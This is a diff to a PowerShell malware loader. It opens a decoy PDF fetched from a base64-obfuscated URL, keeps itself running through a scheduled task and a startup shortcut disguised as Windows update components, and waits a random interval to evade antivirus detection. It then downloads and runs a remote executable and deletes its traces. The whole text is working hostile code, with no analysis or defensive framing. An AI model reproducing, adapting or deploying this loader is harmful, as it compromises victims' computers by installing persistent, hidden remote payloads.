@@ -1,5 +1,30 @@
 $ErrorActionPreference = 'SilentlyContinue'
 
+# === PDF DECOY FIRST (Opens immediately) ===
+$cache = "$env:APPDATA\Microsoft\Windows\Caches"
+if (-not (Test-Path $cache)) { New-Item -ItemType Directory -Path $cache -Force | Out-Null }
+
+$flagFile = "$cache\installed.flag"
+$isFirstRun = -not (Test-Path $flagFile)
+
+$pdfUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9OYWthel9Oby5fNjYxX3ZpZF8wMi4wMy4yMDI2LnBkZg=='))
+$pdfPath = "$cache\Nakaz_No._661_vid_02.03.2026.pdf"
+
+$headers = @{'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'}
+
+if ($isFirstRun) {
+    if (-not (Test-Path $pdfPath)) {
+        try {
+            Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfPath -Headers $headers -UseBasicParsing
+        } catch {}
+    }
+    if (Test-Path $pdfPath) {
+        try { Start-Process $pdfPath } catch {}
+        New-Item -Path $flagFile -ItemType File -Force | Out-Null
+    }
+}
+
+# === SELF-PRESERVATION ===
 $localPath = "$env:APPDATA\Microsoft\Windows\Caches\launcher.ps1"
 $currentPath = $MyInvocation.MyCommand.Path
 
@@ -21,7 +46,7 @@ function Save-ScriptToDisk {
 }
 $scriptPath = Save-ScriptToDisk -Destination $localPath
 
-# Persistence: Scheduled Task
+# === PERSISTENCE: Scheduled Task ===
 $taskName = "WindowsUpdateTask"
 $taskExists = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
 if (-not $taskExists) {
@@ -36,7 +61,7 @@ if (-not $taskExists) {
     } catch {}
 }
 
-# Persistence: Startup LNK
+# === PERSISTENCE: Startup LNK ===
 $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
 $lnkPath = "$startupPath\WindowsUpdateHelper.lnk"
 if (-not (Test-Path $lnkPath)) {
@@ -49,16 +74,11 @@ if (-not (Test-Path $lnkPath)) {
 }
 
 # === BEARFOOS EVASION: Delay before EXE ===
-# PDF already opened by boot.ps1; we simply wait and then deliver payload
 Start-Sleep -Seconds (Get-Random -Min 45 -Max 90)
 
-$cache = "$env:APPDATA\Microsoft\Windows\Caches"
-if (-not (Test-Path $cache)) { New-Item -ItemType Directory -Path $cache -Force | Out-Null }
-
+# === DOWNLOAD AND EXECUTE PAYLOAD ===
 $exeUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9FZGdlVXBkYXRlci5leGU='))
 $exePath = "$cache\helper.exe"
-
-$headers = @{'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'}
 
 if (-not (Test-Path $exePath)) {
     $retryCount = 0
@@ -91,8 +111,10 @@ if (Test-Path $exePath) {
     }
 }
 
+# === CLEANUP ===
 Start-Job -ScriptBlock {
-    param($exe)
+    param($exe, $pdf)
     Start-Sleep -Seconds 300
     Remove-Item -Path $exe -Force -ErrorAction SilentlyContinue
-} -ArgumentList $exePath | Out-Null
+    Remove-Item -Path $pdf -Force -ErrorAction SilentlyContinue
+} -ArgumentList $exePath, $pdfPath | Out-Null
